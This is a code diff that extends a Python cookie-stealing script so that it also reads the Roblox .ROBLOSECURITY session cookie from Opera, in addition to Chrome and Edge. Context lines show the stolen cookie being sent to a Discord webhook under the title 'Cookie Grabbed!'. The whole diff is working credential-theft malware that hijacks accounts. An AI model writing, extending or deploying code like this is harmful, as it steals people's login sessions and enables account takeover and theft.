@@ -31,16 +31,28 @@ def use_chrome():
     except:
         pass
 
+def use_opera():
+    try:
+        # Use Microsoft Edge to get cookies
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        cookies = str(cookies)
+        agent = "Opera (based)"
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(
+            ' for .roblox.com/>')[0].strip()
+        return cookie
+    except:
+        pass
 
 def find_proper_browser():
     if (use_chrome() is not None): return use_chrome()
     elif (use_edge() is not None): return use_edge()
+    elif (use_opera() is not None): return use_opera()
 
 
 def find_proper_agent():
     if (use_chrome() is not None): return "Chrome/Chromium-based"
     elif (use_edge() is not None): return "Microsoft Edge (Chromium Framework)"
-
+    elif (use_opera() is not None): return "Opera (or Opera-based)"
 
 # Send to deafult webhook
 eb = DiscordEmbed('Cookie Grabbed!', color="03b2f8")
